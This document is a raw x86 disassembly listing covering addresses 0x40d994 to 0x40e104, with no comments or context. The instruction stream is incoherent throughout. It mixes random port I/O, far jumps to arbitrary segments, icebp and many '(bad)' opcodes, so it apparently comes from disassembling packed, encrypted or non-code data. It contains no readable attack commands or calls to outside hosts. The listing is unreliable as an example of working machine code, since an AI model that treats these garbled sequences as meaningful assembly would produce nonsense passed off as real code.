  40d994:	jmp    0x1108:0xc19c6a4f
  40d99b:	ret    
  40d99c:	push   edi
  40d99d:	adc    ch,dl
  40d99f:	imul   edx,DWORD PTR [ecx+0x2809fc84],0x82525811
  40d9a9:	pop    ds
  40d9aa:	lds    edx,FWORD PTR [edx]
  40d9ac:	or     BYTE PTR [esi+0x3b3c15fd],dl
  40d9b2:	test   DWORD PTR [ecx-0x4bd5ed92],edx
  40d9b8:	lock loop 0x40d991
  40d9bb:	cmp    eax,0xae7aeca5
  40d9c0:	std    
  40d9c1:	enter  0xf852,0xda
  40d9c5:	rcl    dl,1
  40d9c7:	mov    dl,0x19
  40d9c9:	jo     0x40da22
  40d9cb:	imul   eax,DWORD PTR [edx],0xbd862445
  40d9d1:	jmp    0x40d979
  40d9d3:	addr16 xchg ecx,eax
  40d9d5:	pop    edi
  40d9d6:	mov    BYTE PTR [ebx-0x69],dh
  40d9d9:	sbb    eax,0x412f85f1
  40d9de:	pop    esp
  40d9df:	icebp  
  40d9e0:	mov    eax,0x3e19b71d
  40d9e5:	and    edi,edi
  40d9e7:	cmp    eax,0x6378a272
  40d9ec:	in     al,0xb2
  40d9ee:	inc    edx
  40d9ef:	and    al,0x7c
  40d9f1:	inc    edx
  40d9f2:	xchg   esi,eax
  40d9f3:	or     edi,DWORD PTR [esi+0x388d504b]
  40d9f9:	into   
  40d9fa:	(bad)  
  40d9fb:	push   esi
  40d9fc:	sbb    bl,BYTE PTR [ebx-0x13f7750e]
  40da02:	sub    eax,0xd0c4d4d9
  40da07:	xchg   DWORD PTR [edx+0x14],edx
  40da0a:	int3   
  40da0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da0c:	test   ebx,ebx
  40da0e:	adc    eax,DWORD PTR ds:0xf2c8f250
  40da14:	and    BYTE PTR [ebx],0xbe
  40da17:	pop    ebx
  40da18:	ins    DWORD PTR es:[edi],dx
  40da19:	icebp  
  40da1a:	mov    BYTE PTR [eax+ecx*4],ch
  40da1d:	stos   BYTE PTR es:[edi],al
  40da1e:	ja     0x40da8e
  40da20:	push   es
  40da21:	push   edx
  40da22:	pop    ebx
  40da23:	dec    edi
  40da24:	xchg   BYTE PTR [bp+si-0x2e],bh
  40da28:	hlt    
  40da29:	cld    
  40da2a:	out    dx,eax
  40da2b:	fstp   TBYTE PTR [bp+0x1c]
  40da2f:	push   eax
  40da30:	adc    ecx,DWORD PTR [ebp+0x63]
  40da33:	dec    dh
  40da35:	jae    0x40da25
  40da37:	and    eax,0x563cf5f4
  40da3c:	or     esi,esp
  40da3e:	inc    eax
  40da3f:	lods   eax,DWORD PTR ds:[esi]
  40da40:	leave  
  40da41:	popa   
  40da42:	ficomp DWORD PTR [esi]
  40da44:	xchg   BYTE PTR gs:[esi],dl
  40da47:	dec    edi
  40da48:	fild   WORD PTR [edi+0x78]
  40da4b:	pop    esi
  40da4c:	retf   
  40da4d:	dec    ecx
  40da4e:	xor    bl,bh
  40da50:	dec    edx
  40da51:	cs dec eax
  40da53:	cs mov ah,0xa6
  40da56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da57:	jp     0x40da93
  40da59:	mov    dl,0x89
  40da5b:	adc    ch,dh
  40da5d:	(bad)  
  40da5e:	repz int3 
  40da60:	(bad)  
  40da61:	out    0xa2,al
  40da63:	lea    esp,[ebp+edx*2-0x5c34ec4]
  40da6a:	xor    al,0xab
  40da6c:	mov    esi,ebx
  40da6e:	nop
  40da6f:	mov    eax,ds:0x5328f195
  40da74:	ja     0x40da6f
  40da76:	adc    BYTE PTR [ecx],al
  40da78:	or     edi,esi
  40da7a:	jg     0x40da8a
  40da7c:	jg     0x40da98
  40da7e:	loop   0x40daaf
  40da80:	sbb    al,0x9e
  40da82:	rol    DWORD PTR [edi+0x2b],0xd3
  40da86:	sti    
  40da87:	pusha  
  40da88:	xchg   esp,eax
  40da89:	cmp    ch,BYTE PTR [ecx-0x39]
  40da8c:	arpl   WORD PTR [ebp+0x39],cx
  40da8f:	pushf  
  40da90:	je     0x40da8b
  40da92:	fisub  DWORD PTR [esi-0x61b3340d]
  40da98:	pop    es
  40da99:	cmp    BYTE PTR [ebp-0x2cf9b0e9],ah
  40da9f:	lds    eax,FWORD PTR [ebx+0x4c]
  40daa2:	daa    
  40daa3:	lds    edi,FWORD PTR [ebx+eiz*2+0x3bbc15bb]
  40daaa:	and    BYTE PTR [ebx+0x50b6dc27],bl
  40dab0:	mov    ebx,0xf8e00a8b
  40dab5:	jno    0x40dac4
  40dab7:	js     0x40daa9
  40dab9:	push   es
  40daba:	les    edx,FWORD PTR [ecx+0x0]
  40dabd:	mov    edi,0x7d4926e2
  40dac2:	test   al,0x33
  40dac4:	cdq    
  40dac5:	out    dx,eax
  40dac6:	arpl   bx,dx
  40dac8:	frstor [eax]
  40daca:	gs jg  0x40da53
  40dacd:	pop    ecx
  40dace:	aad    0xed
  40dad0:	mov    ch,0x1a
  40dad2:	push   ebp
  40dad3:	mov    fs,WORD PTR [esp+edi*1-0x4a]
  40dad7:	in     eax,0x8f
  40dad9:	sub    ebx,ecx
  40dadb:	jge    0x40db20
  40dadd:	sahf   
  40dade:	call   0x483df35
  40dae3:	or     BYTE PTR [eax+0x4c44c8f8],al
  40dae9:	mov    ah,0x66
  40daeb:	hlt    
  40daec:	xchg   ecx,edx
  40daee:	jns    0x40dad1
  40daf0:	outs   dx,DWORD PTR ds:[esi]
  40daf1:	imul   edx,DWORD PTR ds:0xea0c416,0x7f706a5b
  40dafb:	xlat   BYTE PTR ds:[ebx]
  40dafc:	or     dh,BYTE PTR [edx+esi*8]
  40daff:	(bad)  
  40db01:	(bad)  
  40db02:	mov    ecx,0xf64204f3
  40db07:	dec    esi
  40db08:	mov    ch,0xb6
  40db0a:	xchg   edi,eax
  40db0b:	xor    eax,0x2a6efd14
  40db10:	mov    ebx,0x2032d7c2
  40db15:	inc    esi
  40db16:	aas    
  40db17:	jno    0x40db0f
  40db19:	mov    ah,0x48
  40db1b:	(bad)  
  40db1c:	sub    ch,BYTE PTR [ebx-0x52bdfd03]
  40db22:	mov    ds:0x980b10c3,eax
  40db27:	ret    
  40db28:	retf   
  40db29:	(bad)  
  40db2a:	jnp    0x40db23
  40db2c:	cmc    
  40db2d:	or     BYTE PTR [ebp-0x49a05641],al
  40db33:	or     al,0x11
  40db35:	sti    
  40db36:	(bad)  
  40db37:	daa    
  40db38:	mov    bl,0x6
  40db3a:	retf   0xd260
  40db3d:	mov    esp,0x75ef9f45
  40db42:	cmc    
  40db43:	mov    DWORD PTR [edi],eax
  40db45:	pop    ecx
  40db46:	mov    ebx,?
  40db48:	cs fcompp 
  40db4b:	inc    edx
  40db4c:	out    0xea,al
  40db4e:	push   ebp
  40db4f:	push   ebp
  40db50:	aad    0x7d
  40db52:	and    esi,DWORD PTR [edx]
  40db54:	mov    eax,ds:0x34c473f4
  40db59:	ret    0xdde
  40db5c:	jmp    0xc2a8a752
  40db61:	cmp    al,0xd8
  40db63:	addr16 push ebx
  40db65:	push   ds
  40db66:	sar    cl,1
  40db68:	loopne 0x40db93
  40db6a:	mov    eax,ds:0xff991b8e
  40db6f:	into   
  40db70:	mov    ch,0x68
  40db72:	sbb    eax,0x31b4ca31
  40db77:	sbb    BYTE PTR [esi+edx*2],dl
  40db7a:	jecxz  0x40dbb8
  40db7c:	std    
  40db7d:	mov    DWORD PTR ds:0x605ec554,esp
  40db83:	dec    esp
  40db84:	in     eax,dx
  40db85:	out    dx,al
  40db86:	cmp    edi,ebp
  40db88:	stos   DWORD PTR es:[edi],eax
  40db89:	mov    BYTE PTR [ebx],ch
  40db8b:	div    BYTE PTR [edx+0x7c81fe67]
  40db91:	in     al,dx
  40db92:	mov    ch,0xd6
  40db94:	call   0x78e6:0x6414ce98
  40db9b:	aad    0x15
  40db9d:	jo     0x40db49
  40db9f:	inc    edi
  40dba0:	pusha  
  40dba1:	aas    
  40dba2:	sub    DWORD PTR [ebx+0x7da5c127],ebp
  40dba8:	dec    ebp
  40dba9:	push   0xffffff95
  40dbab:	sbb    al,0x0
  40dbad:	xor    esi,ebx
  40dbaf:	nop
  40dbb0:	pop    edx
  40dbb1:	add    al,0x29
  40dbb3:	std    
  40dbb4:	rcl    BYTE PTR [esi+0x6],1
  40dbb7:	iret   
  40dbb8:	fidiv  WORD PTR [esi]
  40dbba:	jmp    0x40dba7
  40dbbc:	das    
  40dbbd:	lods   eax,DWORD PTR ds:[esi]
  40dbbe:	bound  edi,QWORD PTR [eax+0x26]
  40dbc1:	pop    esp
  40dbc2:	int    0x56
  40dbc4:	shl    DWORD PTR [ecx],0x84
  40dbc7:	push   ebx
  40dbc8:	addr16 std 
  40dbca:	enter  0x74c,0xd3
  40dbce:	rcr    BYTE PTR [eax-0x79],0x5d
  40dbd2:	add    esi,edx
  40dbd4:	jmp    0xb682:0x497a7e66
  40dbdb:	pop    eax
  40dbdc:	cmp    eax,0x14861013
  40dbe1:	int    0x30
  40dbe3:	ds popf 
  40dbe5:	pop    esp
  40dbe6:	imul   ebp,eax,0xd9d28f7d
  40dbec:	shr    dl,cl
  40dbee:	bound  edx,QWORD PTR [ebp+0xb]
  40dbf1:	ret    
  40dbf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf3:	ror    al,1
  40dbf5:	cmp    BYTE PTR [ebx],bl
  40dbf7:	test   dl,dl
  40dbf9:	loop   0x40dc01
  40dbfb:	aas    
  40dbfc:	int    0xd4
  40dbfe:	sahf   
  40dbff:	mul    BYTE PTR [ecx-0x1f]
  40dc02:	outs   dx,BYTE PTR ds:[esi]
  40dc03:	push   es
  40dc04:	mov    dl,0xcd
  40dc06:	rcr    DWORD PTR [eax+0x3477c070],0x9c
  40dc0d:	xor    eax,DWORD PTR [edi]
  40dc0f:	sub    ch,bh
  40dc11:	js     0x40dc16
  40dc13:	cdq    
  40dc14:	das    
  40dc15:	jns    0x40dbaa
  40dc17:	mov    ch,0xe9
  40dc19:	jmp    0xc3c:0xe0b383c2
  40dc20:	mov    ebp,0xc77b30f6
  40dc25:	xchg   edi,eax
  40dc26:	xchg   esi,eax
  40dc27:	rcl    DWORD PTR [eax+0x2f66c801],cl
  40dc2d:	les    esp,FWORD PTR [edi]
  40dc2f:	xor    ah,BYTE PTR [edi-0x5e]
  40dc32:	cmc    
  40dc33:	jo     0x40dc90
  40dc35:	cld    
  40dc36:	data16 je 0x40dc9c
  40dc39:	jnp    0x40dc22
  40dc3b:	xor    eax,0x8c71781f
  40dc40:	(bad)  
  40dc42:	icebp  
  40dc43:	test   eax,0xa609cde4
  40dc48:	cld    
  40dc49:	sbb    edx,DWORD PTR [eax+ebx*4]
  40dc4c:	out    0xbd,eax
  40dc4e:	shr    bh,0xe8
  40dc51:	cli    
  40dc52:	lock data16 cld 
  40dc55:	lds    ecx,FWORD PTR [edx+0x5e530952]
  40dc5b:	adc    edx,0xffffffd6
  40dc5e:	arpl   WORD PTR [esp+eax*1-0x45],bp
  40dc62:	pop    ds
  40dc63:	push   edx
  40dc64:	addr16 mov ebp,0x67b5fe2c
  40dc6a:	adc    ah,BYTE PTR [edi]
  40dc6c:	add    ebp,DWORD PTR [ebp+0x6d765a4b]
  40dc72:	shr    ecx,1
  40dc74:	and    edi,DWORD PTR [ebx]
  40dc76:	ffreep st(2)
  40dc78:	sbb    BYTE PTR ds:0xf12d006a,0x89
  40dc7f:	out    dx,al
  40dc80:	dec    ebx
  40dc81:	cli    
  40dc82:	dec    ebx
  40dc83:	add    al,0xde
  40dc85:	nop
  40dc86:	pop    edi
  40dc87:	add    dh,ah
  40dc89:	pop    edx
  40dc8a:	cli    
  40dc8b:	pop    ecx
  40dc8c:	(bad)  
  40dc8d:	aad    0xbc
  40dc8f:	retf   
  40dc90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc91:	call   0xf8ceb658
  40dc96:	lds    edx,FWORD PTR [ebx]
  40dc98:	inc    ecx
  40dc99:	shl    DWORD PTR [ecx+0x57],cl
  40dc9c:	push   esp
  40dc9d:	out    0x47,al
  40dc9f:	cmp    bl,ah
  40dca1:	and    dh,cl
  40dca3:	(bad)  
  40dca4:	fld    TBYTE PTR [ebp+0x515b6fbc]
  40dcaa:	sub    BYTE PTR [ecx-0x7a],0x23
  40dcae:	mov    esi,0xf72475e1
  40dcb3:	add    bh,BYTE PTR [esi+0x35]
  40dcb6:	dec    ebp
  40dcb7:	int3   
  40dcb8:	test   DWORD PTR [edx-0x27],eax
  40dcbb:	arpl   WORD PTR cs:[eax+0x65d008ad],di
  40dcc2:	cs cld 
  40dcc4:	cmp    eax,0xf9b420ef
  40dcc9:	adc    eax,esp
  40dccb:	sub    DWORD PTR [esi],esi
  40dccd:	stos   DWORD PTR es:[edi],eax
  40dcce:	push   ecx
  40dccf:	bswap  ebp
  40dcd1:	push   esi
  40dcd2:	fyl2x  
  40dcd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcd5:	outs   dx,BYTE PTR ds:[esi]
  40dcd6:	mov    ebx,0x47900443
  40dcdb:	outs   dx,BYTE PTR ds:[esi]
  40dcdc:	sbb    al,0xde
  40dcde:	jns    0x40dc67
  40dce0:	pop    edi
  40dce1:	jbe    0x40dca2
  40dce3:	jbe    0x40dcce
  40dce5:	mov    edi,0xcc5cdc31
  40dcea:	sub    DWORD PTR [eax-0xe3bb27d],esp
  40dcf0:	int3   
  40dcf1:	loope  0x40dd5b
  40dcf3:	out    dx,eax
  40dcf4:	das    
  40dcf5:	cmp    cl,BYTE PTR [edi-0x42d60d63]
  40dcfb:	jmp    0xe8d6:0xe9e618c2
  40dd02:	mov    ch,0x2
  40dd04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd05:	xor    DWORD PTR [eax+0x19d4a38f],esi
  40dd0b:	js     0x40dce5
  40dd0d:	int    0xb8
  40dd0f:	mov    DWORD PTR [edx+edi*4+0x3805d3c9],eax
  40dd16:	dec    ecx
  40dd17:	in     al,dx
  40dd18:	fsub   QWORD PTR [ecx+0x107a32e5]
  40dd1e:	and    al,bl
  40dd20:	in     al,0x9b
  40dd22:	xchg   edi,edx
  40dd24:	popf   
  40dd25:	jae    0x40dcab
  40dd27:	icebp  
  40dd28:	out    dx,eax
  40dd29:	(bad)  
  40dd2a:	fist   WORD PTR [ebx+ecx*8]
  40dd2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd2e:	(bad)  
  40dd30:	inc    esi
  40dd31:	mov    al,0x4
  40dd33:	shl    esp,cl
  40dd35:	inc    ebx
  40dd36:	fmul   DWORD PTR [eax+0x8]
  40dd39:	adc    cl,BYTE PTR [ebx+0x26]
  40dd3c:	or     esp,DWORD PTR [ecx]
  40dd3e:	stc    
  40dd3f:	mov    edx,0x50e56b24
  40dd44:	dec    esp
  40dd45:	adc    al,0xf6
  40dd47:	xchg   esp,esi
  40dd49:	jle    0x40dd04
  40dd4b:	adc    edx,esp
  40dd4d:	push   ebp
  40dd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd4f:	lea    eax,[ecx+0x7e05e538]
  40dd55:	fsubp  st(1),st
  40dd57:	xor    eax,0xa79cc255
  40dd5c:	aam    0x71
  40dd5e:	fcmovbe st,st(3)
  40dd60:	imul   esp,DWORD PTR [ebp+0x49],0xfffffff2
  40dd64:	or     DWORD PTR [edx+0x7e],ebx
  40dd67:	pop    esp
  40dd68:	pop    ebp
  40dd69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd6a:	mov    esi,0x9e0f42d5
  40dd6f:	repz jb 0x40ddc1
  40dd72:	loope  0x40dde1
  40dd74:	popf   
  40dd75:	mov    esp,0xba33ad57
  40dd7a:	std    
  40dd7b:	clc    
  40dd7c:	mov    esi,0x1891981f
  40dd81:	push   esi
  40dd82:	das    
  40dd83:	sub    dh,bh
  40dd85:	jecxz  0x40dd65
  40dd87:	or     bl,0xa8
  40dd8a:	rcl    cl,0x68
  40dd8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd8e:	mov    ebx,eax
  40dd90:	mov    edi,0x21645670
  40dd95:	or     eax,0x9ad175c7
  40dd9a:	lahf   
  40dd9b:	jo     0x40dd39
  40dd9d:	sub    cl,BYTE PTR [eax-0x39]
  40dda0:	aaa    
  40dda1:	or     ebp,esi
  40dda3:	mov    cl,BYTE PTR [esi+0x11815eea]
  40dda9:	push   ss
  40ddaa:	pop    ss
  40ddab:	push   ecx
  40ddac:	pop    ss
  40ddad:	sub    al,0x31
  40ddaf:	inc    ebp
  40ddb0:	mov    edx,0x5a33f92e
  40ddb5:	jns    0x40dd65
  40ddb7:	pusha  
  40ddb8:	push   edi
  40ddb9:	jne    0x40dd72
  40ddbb:	push   0x23a07d4b
  40ddc0:	dec    esi
  40ddc1:	daa    
  40ddc2:	fdiv   DWORD PTR [ebp+0x4468a17]
  40ddc8:	test   bh,dl
  40ddca:	shl    DWORD PTR [ebx-0x7de8e649],1
  40ddd0:	jmp    0x40dd92
  40ddd2:	dec    edi
  40ddd3:	jmp    0xb8ab:0x21972983
  40ddda:	push   es
  40dddb:	fwait
  40dddc:	add    edi,ecx
  40ddde:	popf   
  40dddf:	fsubrp st(6),st
  40dde1:	add    DWORD PTR [edi-0x7a],edx
  40dde4:	lods   al,BYTE PTR ds:[esi]
  40dde5:	push   esi
  40dde6:	or     DWORD PTR [eax+0x7881052],edx
  40ddec:	std    
  40dded:	adc    BYTE PTR [ebx+ebx*1+0x42a17baa],dh
  40ddf4:	or     eax,DWORD PTR [edi]
  40ddf6:	or     bh,BYTE PTR [edi+0x72]
  40ddf9:	push   eax
  40ddfa:	out    0xd2,al
  40ddfc:	push   es
  40ddfd:	mov    esp,0x89584152
  40de02:	push   edi
  40de03:	mov    esp,DWORD PTR [edx+edx*2+0x7c67a2f4]
  40de0a:	inc    edi
  40de0b:	pushf  
  40de0c:	stc    
  40de0d:	jmp    0x40de4d
  40de0f:	mov    edi,0x1631cb55
  40de14:	pop    edx
  40de15:	sahf   
  40de16:	pushf  
  40de17:	sbb    esp,ecx
  40de19:	add    eax,0xa4ab3b4d
  40de1e:	adc    eax,0x36c1c987
  40de23:	stos   DWORD PTR es:[edi],eax
  40de24:	(bad)  
  40de25:	mov    ah,0x83
  40de27:	loopne 0x40ddb6
  40de29:	push   cs
  40de2a:	dec    eax
  40de2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de2c:	add    al,0xf0
  40de2e:	mov    edx,0x29def058
  40de33:	jne    0x40de27
  40de35:	in     al,0xcf
  40de37:	dec    ebp
  40de38:	inc    edx
  40de39:	push   0xffffffa9
  40de3b:	pop    ebp
  40de3c:	in     eax,0xa3
  40de3e:	and    DWORD PTR es:[edx+0x6f],esp
  40de42:	jmp    0x113c:0xa7aaafcf
  40de49:	mov    esi,DWORD PTR [esi+ecx*1+0x61]
  40de4d:	jae    0x40dddc
  40de4f:	jnp    0x40de0a
  40de51:	pop    ecx
  40de52:	dec    esi
  40de53:	sbb    edx,esp
  40de55:	nop
  40de56:	(bad)  
  40de57:	jle    0x40de8e
  40de59:	mov    BYTE PTR [ebp+eiz*1+0x5c],dl
  40de5d:	pop    ecx
  40de5e:	push   ebx
  40de5f:	or     ecx,eax
  40de61:	or     dl,BYTE PTR [edi]
  40de63:	int3   
  40de64:	adc    eax,0x4a69478c
  40de69:	mov    ebx,0x5be94531
  40de6e:	mov    ah,0x74
  40de70:	imul   edx,DWORD PTR ds:0x876f7aed,0x257b7ecb
  40de7a:	push   ss
  40de7b:	inc    edi
  40de7c:	iret   
  40de7d:	jge    0x40deda
  40de7f:	mov    DWORD PTR [esi-0x3a877515],ecx
  40de85:	push   esp
  40de86:	sub    eax,0xacf56b7b
  40de8b:	mov    edi,0x374b01b3
  40de90:	inc    eax
  40de91:	add    al,0x4d
  40de93:	xchg   ebx,eax
  40de94:	fcom   DWORD PTR [edi+0x165f710b]
  40de9a:	jecxz  0x40de42
  40de9c:	xor    al,0x40
  40de9e:	mul    BYTE PTR [ebp-0x1726da79]
  40dea4:	cmp    BYTE PTR ds:0x544f4ac6,ah
  40deaa:	jmp    0x40dea1
  40deac:	not    BYTE PTR [eax]
  40deae:	cmp    al,BYTE PTR [ecx+0x3c3610e0]
  40deb4:	inc    ebp
  40deb5:	pop    ss
  40deb6:	xor    al,0x4a
  40deb8:	pop    esi
  40deb9:	(bad)  
  40deba:	(bad)  
  40debb:	mov    esp,0x6443c92f
  40dec0:	mov    esp,0xbd6204f3
  40dec5:	int3   
  40dec6:	cmp    al,BYTE PTR [ebx-0x67ca8929]
  40decc:	ret    
  40decd:	inc    esp
  40dece:	dec    edi
  40decf:	dec    ecx
  40ded0:	ja     0x40deba
  40ded2:	xchg   DWORD PTR [edx],esp
  40ded4:	cmp    eax,0x33922eb1
  40ded9:	out    0xfa,eax
  40dedb:	jp     0x40dee2
  40dedd:	cmp    BYTE PTR [ebp-0x67],0xaa
  40dee1:	pop    edi
  40dee2:	inc    edi
  40dee3:	lds    eax,FWORD PTR [ecx]
  40dee5:	pop    ds
  40dee6:	xor    dh,BYTE PTR [esp+eax*1-0x2135468e]
  40deed:	dec    eax
  40deee:	or     DWORD PTR [eax-0x35],eax
  40def1:	hlt    
  40def2:	push   edx
  40def3:	xor    ch,dl
  40def5:	sbb    eax,DWORD PTR [ebx-0x12]
  40def8:	stos   DWORD PTR es:[edi],eax
  40def9:	mov    cl,0x5b
  40defb:	cli    
  40defc:	pop    es
  40defd:	xor    BYTE PTR [edx+0x1518bfd0],dh
  40df03:	cmp    al,0xbb
  40df05:	push   0x6c3a2af0
  40df0a:	add    eax,0x14ae93ae
  40df0f:	mov    ch,0x3b
  40df11:	xor    eax,0xd3a2aed
  40df16:	push   ss
  40df17:	das    
  40df18:	mov    dh,0x6d
  40df1a:	jmp    0x88bc:0xa7af9ecb
  40df21:	cmp    al,BYTE PTR [edi+0x5]
  40df24:	(bad)  
  40df26:	into   
  40df27:	sbb    cl,ah
  40df29:	rol    BYTE PTR [eax],0x53
  40df2c:	adc    DWORD PTR [ebp-0x27],edi
  40df2f:	mov    ds:0x1c602607,al
  40df34:	adc    esp,DWORD PTR [esi]
  40df36:	push   es
  40df37:	loopne 0x40df20
  40df39:	test   BYTE PTR [esi+0x13],0x79
  40df3d:	ds shl dh,1
  40df40:	adc    BYTE PTR [ebx+0x38],ch
  40df43:	not    BYTE PTR [eax+0x2d23e214]
  40df49:	pop    edx
  40df4a:	in     eax,0xe5
  40df4c:	out    0x9f,al
  40df4e:	xor    BYTE PTR ds:0x356b4cfe,cl
  40df54:	pusha  
  40df55:	cmp    cl,BYTE PTR [edx+0x5406f108]
  40df5b:	sbb    DWORD PTR [ebx-0x21],esp
  40df5e:	xchg   edx,eax
  40df5f:	loopne 0x40df30
  40df61:	xchg   esp,eax
  40df62:	lods   al,BYTE PTR ds:[esi]
  40df63:	inc    esi
  40df64:	mov    bl,0x61
  40df66:	in     eax,0x47
  40df68:	jecxz  0x40df83
  40df6a:	jae    0x40df08
  40df6c:	mov    eax,ds:0x13f4aa00
  40df71:	jp     0x40dfb7
  40df73:	sbb    ch,bh
  40df75:	add    dh,ah
  40df77:	jmp    0x8681:0x1dca710f
  40df7e:	mov    dl,0xd
  40df80:	jne    0x40df24
  40df82:	pusha  
  40df83:	retf   0x88a8
  40df86:	sbb    DWORD PTR [edx+0x7],esi
  40df89:	mov    bl,0x66
  40df8b:	loope  0x40df20
  40df8d:	call   0xe2b4:0x24d557b7
  40df94:	fsubr  DWORD PTR [eax-0x15]
  40df97:	push   edi
  40df98:	ret    0x921a
  40df9b:	mov    edi,ebx
  40df9d:	dec    ecx
  40df9e:	jmp    0x40df4c
  40dfa0:	sub    esp,DWORD PTR [ecx]
  40dfa2:	add    BYTE PTR [eax+0xf7c1624],ah
  40dfa8:	or     edi,DWORD PTR [ebp-0x6b]
  40dfab:	xchg   BYTE PTR [esi-0x342f43e3],al
  40dfb1:	adc    al,0x8c
  40dfb3:	add    esi,DWORD PTR [ebx]
  40dfb5:	cs ret 0x6c7e
  40dfb9:	in     eax,0x8a
  40dfbb:	xchg   ebp,eax
  40dfbc:	jl     0x40df43
  40dfbe:	js     0x40e035
  40dfc0:	pop    ecx
  40dfc1:	and    eax,0xca4f099f
  40dfc6:	pop    esp
  40dfc7:	pushf  
  40dfc8:	adc    cl,BYTE PTR ds:0x48f8eee4
  40dfce:	imul   ecx,DWORD PTR [eax],0xffffffb7
  40dfd1:	cmp    bl,BYTE PTR [ecx-0x2a8fb70d]
  40dfd7:	cwde   
  40dfd8:	ins    BYTE PTR es:[edi],dx
  40dfd9:	in     al,dx
  40dfda:	rol    BYTE PTR [esi+0x32],1
  40dfdd:	xchg   edx,eax
  40dfde:	inc    ebx
  40dfdf:	and    al,0x73
  40dfe1:	outs   dx,DWORD PTR ds:[esi]
  40dfe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfe3:	(bad)  
  40dfe4:	in     eax,dx
  40dfe5:	jl     0x40dfa8
  40dfe7:	int    0x76
  40dfe9:	or     al,0x47
  40dfeb:	or     cl,BYTE PTR [esi]
  40dfed:	outs   dx,BYTE PTR ds:[esi]
  40dfee:	cmp    DWORD PTR [edi-0xa94fb21],ecx
  40dff4:	mov    ecx,0xeb11ccce
  40dff9:	mov    ebp,0xd497123e
  40dffe:	(bad)  
  40e000:	sbb    BYTE PTR [eax-0x1d],al
  40e003:	sub    eax,0xc7c12e48
  40e008:	(bad)  
  40e009:	pop    es
  40e00a:	push   edi
  40e00b:	das    
  40e00c:	outs   dx,BYTE PTR ds:[esi]
  40e00d:	sbb    eax,0x1c780676
  40e012:	pop    eax
  40e013:	jb     0x40dfc1
  40e015:	jnp    0x40e072
  40e017:	dec    edx
  40e018:	pop    esi
  40e019:	inc    ecx
  40e01a:	xchg   ecx,eax
  40e01b:	add    eax,0x391f8fea
  40e020:	call   0xe821174c
  40e025:	push   eax
  40e026:	mov    bl,0x24
  40e028:	mov    al,0xfb
  40e02a:	outs   dx,DWORD PTR ds:[esi]
  40e02b:	sub    al,0xdb
  40e02d:	mov    al,0x4d
  40e02f:	xor    al,0x4d
  40e031:	xor    BYTE PTR [edi+eiz*4],bl
  40e034:	aam    0xfb
  40e036:	xor    eax,0x2bc684de
  40e03b:	adc    bx,WORD PTR [esi+0x56]
  40e03f:	addr16 add ebp,0x43
  40e043:	add    ebp,DWORD PTR [ebp+0x45300cf5]
  40e049:	mov    bl,BYTE PTR fs:[ecx+0x35]
  40e04d:	cmp    al,0x78
  40e04f:	mov    DWORD PTR [esi-0x50],eax
  40e052:	xor    al,0xa3
  40e054:	popa   
  40e055:	mov    ebp,fs
  40e057:	push   es
  40e058:	(bad)  
  40e059:	cmp    ebp,DWORD PTR [eax+0x24]
  40e05c:	ss sub al,0x13
  40e05f:	hlt    
  40e060:	mov    BYTE PTR [ebp-0x46191bfe],cl
  40e066:	jg     0x40e019
  40e068:	cmp    bh,cl
  40e06a:	(bad)
  40e06d:	repnz sbb cl,bl
  40e070:	scas   al,BYTE PTR es:[edi]
  40e071:	cwde   
  40e072:	fs mov es,ebp
  40e075:	adc    eax,0x8db80304
  40e07a:	xchg   ebp,eax
  40e07b:	or     ah,BYTE PTR [eax]
  40e07d:	jge    0x40e0d8
  40e07f:	cmp    al,0x4a
  40e081:	cmp    BYTE PTR [ecx-0x58],cl
  40e084:	(bad)  
  40e085:	shl    DWORD PTR [ecx-0x16a433e0],cl
  40e08b:	loope  0x40e064
  40e08d:	bnd jbe 0x40e026
  40e090:	sub    ah,cl
  40e092:	dec    ebp
  40e093:	push   edi
  40e094:	xor    DWORD PTR [ecx+edx*1],esi
  40e097:	mov    bh,0xe4
  40e099:	mov    dh,BYTE PTR [eax+eax*8]
  40e09c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e09d:	outs   dx,DWORD PTR ds:[esi]
  40e09e:	mul    BYTE PTR [edx+0x54]
  40e0a1:	test   DWORD PTR [ebx],0xa51a0100
  40e0a7:	cmp    ebp,DWORD PTR [esi+0x14]
  40e0aa:	push   ss
  40e0ab:	dec    ecx
  40e0ac:	sub    al,dl
  40e0ae:	push   esi
  40e0af:	aad    0xe4
  40e0b1:	in     al,0xa4
  40e0b3:	mov    ecx,0xfeb348b0
  40e0b8:	inc    edi
  40e0b9:	jno    0x40e108
  40e0bb:	push   esi
  40e0bc:	call   0xf10c7067
  40e0c1:	jne    0x40e12e
  40e0c3:	loopne 0x40e099
  40e0c5:	mov    ecx,cs
  40e0c7:	(bad)  
  40e0c9:	mov    esp,0x83f837da
  40e0ce:	sbb    bh,bl
  40e0d0:	cmp    eax,0x41351427
  40e0d5:	xchg   edi,eax
  40e0d6:	xlat   BYTE PTR ds:[ebx]
  40e0d7:	gs loop 0x40e154
  40e0da:	fucom  st(4)
  40e0dc:	mov    eax,0x2f028d1f
  40e0e1:	iret   
  40e0e2:	mov    ebp,0xe1314fe6
  40e0e7:	ins    DWORD PTR es:[edi],dx
  40e0e8:	dec    ebp
  40e0e9:	and    DWORD PTR [edi+edi*4],ebp
  40e0ec:	add    al,0xec
  40e0ee:	pusha  
  40e0ef:	mov    dh,0xad
  40e0f1:	push   ecx
  40e0f2:	into   
  40e0f3:	inc    ecx
  40e0f4:	int3   
  40e0f5:	rcl    bl,cl
  40e0f7:	push   esi
  40e0f8:	xlat   BYTE PTR ds:[ebx]
  40e0f9:	sbb    bh,BYTE PTR [edi]
  40e0fb:	push   edi
  40e0fc:	ins    BYTE PTR es:[edi],dx
  40e0fd:	pop    esp
  40e0fe:	fstp   TBYTE PTR [edi-0x40ffd0d5]
  40e104:	out    dx,al
